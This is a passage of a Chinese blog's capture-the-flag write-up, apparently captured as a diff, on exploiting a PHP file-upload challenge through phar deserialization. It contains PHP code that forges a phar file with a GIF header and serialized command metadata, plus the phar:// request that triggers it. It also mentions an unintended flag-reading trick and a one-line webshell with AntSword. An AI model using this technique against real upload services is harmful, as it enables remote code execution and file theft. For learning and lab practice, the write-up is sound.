+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">随便上传一个txt，回显</span><br><span class="line"></span><br><span class="line">![avatar](https:&#x2F;&#x2F;k1ng0fic3.github.io&#x2F;images&#x2F;sql25.png)</span><br><span class="line"></span><br><span class="line">得到的&#96;&#96;&#96;GXY939d6b01691234e49fa8ec7eafb79a55&#96;&#96;&#96;就是$_SESSION[&#39;user&#39;]</span><br><span class="line"></span><br><span class="line">然后在本地生成phar文件：</span><br></pre></td></tr></table></figure>
+<?php
+class Uploader{
+    public $Filename;
+    public $cmd;
+    public $token;
+}
+
+$o = new Uploader();
+$o->cmd = 'highlight_file("/var/www/html/flag.php");'; //里面的命令不要出现单引号否侧生成phar会报错
+$o->Filename = '1';
+$o->token = 'GXY939d6b01691234e49fa8ec7eafb79a55'; //$_SESSION['user']
+echo serialize($o);
+
+$phar = new Phar("phar.phar");
+$phar->startBuffering();
+$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?><p>“); //设置stub，增加gif文件头<br>$phar-&gt;setMetadata($o); //将自定义meta-data存入manifest<br>$phar-&gt;addFromString(“1.txt”, “1”); //添加要压缩的文件<br>$phar-&gt;stopBuffering();</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![avatar](https:&#x2F;&#x2F;k1ng0fic3.github.io&#x2F;images&#x2F;sql26.png)</span><br><span class="line"></span><br><span class="line">将此phar文件上传，获取路径</span><br><span class="line"></span><br><span class="line">![avatar](https:&#x2F;&#x2F;k1ng0fic3.github.io&#x2F;images&#x2F;sql27.png)</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;74def8c80bd66ac6e4585ea8fb35c9f4&#x2F;GXY939d6b01691234e49fa8ec7eafb79a55.txt</span><br></pre></td></tr></table></figure>
+
+<p>在路径前加上phar协议，用来作为name变量的值，访问即可。</p>
+<blockquote>
+<p>home.php?file=upload&amp;name=phar:///var/www/html/uploads/74def8c80bd66ac6e4585ea8fb35c9f4/GXY939d6b01691234e49fa8ec7eafb79a55.txt</p>
+</blockquote>
+<p>在跳转页面上随便上传一个文件，触发反序列化，得到flag</p>
+<p><img src="https://k1ng0fic3.github.io/images/sql28.png" alt="avatar"></p>
+<h5 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h5><p><em>Nepnep</em>师傅们的思路，真是简单无比。<br>由于有</p>
+<blockquote>
+<p>echo file_get_contents($uploader);</p>
+</blockquote>
+<p>这行代码存在。上传后会显示出<code>$uploader</code>这个文件的内容，所以只要使<code>$this-&gt;Filename</code>为<code>flag.php</code>，然后随便传个东西就会得到flag了。</p>
+<p><img src="https://k1ng0fic3.github.io/images/sql29.png" alt="avatar"></p>
+<p>此外还有颖奇师傅利用出题人在正则表达式处的匹配错误，利用一句话+蚁剑打的非预期，不再细说了。</p>
+<p>还是太菜了，要多多向Web大佬巨神们学习才行。</p>
 
       
 
@@ -227,17 +398,6 @@
     <div class="article-info article-info-index">
       
       
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随笔</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
       
 
       
@@ -288,7 +448,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://k1ng0fic3.github.io/2020/01/10/%E5%A4%A7%E4%B8%89%E9%80%89%E8%AF%BE%E5%BF%83%E5%BE%97/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://k1ng0fic3.github.io/2020/01/31/SQL%E6%B3%A8%E5%85%A5%E4%B8%89%E8%BF%9E/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -302,15 +462,11 @@
   
 <nav id="article-nav">
   
-    <a href="/2020/01/11/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E3%81%AE%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          应急响应の流量分析
-        
-      </div>
-    </a>
   
+    <a href="/2020/01/27/%E8%A5%BF%E7%94%B5forensic-wiki%E3%81%AEWindows/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">西电forensic-wikiのWindows</div>
+      <i class="icon-circle-right"></i>
+    </a>
   
 </nav>
 
